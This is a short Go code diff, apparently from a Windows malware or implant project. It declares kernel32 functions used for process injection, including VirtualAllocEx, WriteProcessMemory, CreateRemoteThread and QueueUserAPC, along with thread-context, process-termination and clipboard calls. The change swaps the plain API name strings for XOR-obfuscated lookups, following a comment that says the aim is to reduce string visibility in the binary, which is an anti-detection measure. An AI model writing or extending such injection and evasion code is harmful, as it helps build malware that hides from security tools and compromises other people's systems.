@@ -53,7 +53,7 @@ var (
 	procSetFileAttributesW       = k32.NewProc("SetFileAttributesW")
 	procGetThreadContext         = k32.NewProc("GetThreadContext")
 	procSetThreadContext         = k32.NewProc("SetThreadContext")
-	procOpenProcess              = k32.NewProc("OpenProcess")
+	procOpenProcess              = k32.NewProc(s(SProcOpenP))
 	procTerminateProcess         = k32.NewProc("TerminateProcess")
 	procOpenClipboard            = user32.NewProc("OpenClipboard")
 	procCloseClipboard           = user32.NewProc("CloseClipboard")
@@ -66,17 +66,16 @@ var (
 	procGlobalFree               = k32.NewProc("GlobalFree")
 )
 
-// Process injection proc declarations
-// TODO: Obfuscate these strings using XOR (strxor) to reduce string visibility in the binary
+// Process injection proc declarations (obfuscated via strxor)
 var (
-	procOpenProcessEx      = k32.NewProc("OpenProcess")
-	procVirtualAllocEx     = k32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory = k32.NewProc("WriteProcessMemory")
-	procCreateRemoteThread = k32.NewProc("CreateRemoteThread")
-	procVirtualFreeEx      = k32.NewProc("VirtualFreeEx")
-	procVirtualProtectEx   = k32.NewProc("VirtualProtectEx")
-	procQueueUserAPC       = k32.NewProc("QueueUserAPC")
-	procGetModuleHandleW   = k32.NewProc("GetModuleHandleW")
+	procOpenProcessEx      = k32.NewProc(s(SProcOpenP))
+	procVirtualAllocEx     = k32.NewProc(s(SProcVAllocEx))
+	procWriteProcessMemory = k32.NewProc(s(SProcWPMem))
+	procCreateRemoteThread = k32.NewProc(s(SProcCRThread))
+	procVirtualFreeEx      = k32.NewProc(s(SProcVFreeEx))
+	procVirtualProtectEx   = k32.NewProc(s(SProcVPEx))
+	procQueueUserAPC       = k32.NewProc(s(SProcQUAPC))
+	procGetModuleHandleW   = k32.NewProc(s(SProcGModuleW))
 )
 
 // Constants
